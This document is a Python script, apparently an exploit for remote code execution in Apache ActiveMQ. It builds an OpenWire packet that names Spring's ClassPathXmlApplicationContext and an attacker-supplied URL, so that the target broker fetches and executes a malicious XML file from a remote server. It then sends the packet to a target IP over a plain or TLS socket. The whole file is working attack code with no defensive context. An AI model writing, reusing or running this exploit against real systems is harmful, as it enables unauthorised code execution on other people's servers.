from rich.console import Console
import requests
import socket
import ssl
import argparse
import binascii

console = Console()

class ActiveMQ_RCE:
    @staticmethod
    def string_to_hex(s):
        return binascii.hexlify(s.encode()).decode()

    @classmethod
    def int_to_hex(cls, i, n):
        try:
            if n == 4:
                return f"{i:04x}"
            elif n == 8:
                return f"{i:08x}"
            else:
                raise ValueError("n must 4 or 8")
        except ValueError as e:
            return f"The value error: {e}"

    def main(self):
        parser = argparse.ArgumentParser(description="APache Active MQ RCE exploit ")
        parser.add_argument("-ip", metavar="IP", required=True, help="IP of the target to exploit")
        parser.add_argument("-p", metavar="Port", default=61616, help="Port of the target to exploit where openwire is running default is 61616")
        parser.add_argument("-u", metavar="URL", required=True, help="The URL for the remote-server which fetches the malicious XML file")
        parser.add_argument("-t", action="store_true", help="Use Secure connection TLS for exploitation")
        args = parser.parse_args()

        if not args.ip or not args.u:
            parser.print_usage()
            return

        class_name = "org.springframework.context.support.ClassPathXmlApplicationContext"
        
        console.log(f"Using the class: {class_name}\n")
        message = args.u
        header = "1f00000000000000000001"
        body = header + "01" + self.int_to_hex(len(class_name), 4) + self.string_to_hex(class_name) + "01" + self.int_to_hex(len(message), 4) + self.string_to_hex(message)
        payload = self.int_to_hex(len(body) // 2, 8) + body
        data = bytes.fromhex(payload)

        console.log(f"> The target: {args.ip} : {args.p}\n")
        console.log(f"> The XML file URL: {args.u}\n")
        console.log(f"> Sending packet: \n {payload}\n")

        try:
            if args.t:
                context = ssl.create_default_context()
                conn = context.wrap_socket(socket.create_connection((args.ip, int(args.p))))
            else:
                conn = socket.create_connection((args.ip, int(args.p)))

            conn.sendall(data)
            conn.close()

        except Exception as e:
            console.log(f"Error occurred: {e}")

if __name__ == "__main__":
    obj = ActiveMQ_RCE()
    obj.main()
